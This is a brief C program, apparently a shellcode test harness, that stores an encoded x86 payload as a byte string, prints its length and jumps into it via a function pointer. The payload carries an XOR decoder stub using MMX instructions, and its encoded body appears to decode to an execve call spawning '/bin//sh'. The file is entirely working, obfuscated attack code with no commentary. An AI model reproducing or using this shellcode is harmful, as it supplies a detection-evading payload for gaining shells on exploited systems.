#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x19\x5f\x8d\x77\x08\xb1\x07\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x0d\xe8\xe2\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\x9b\x71\x9b\x63\x9b\x78\x41\xb6\x56\x1b\xa2\x21\x9e\x8e\xfa\xf9\xf8\x23\x4d\x59\x0e\x1a\xa1\x23\x49\xf8\xf9\x67\x2a\x9b\x6a\xea\x9b\x71\x67\x2a\x42\x75\x55\x55\x55\x85\xc8\xc3\xc4\x85\x85\xd9\xc2";

int main()
{
    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();
}
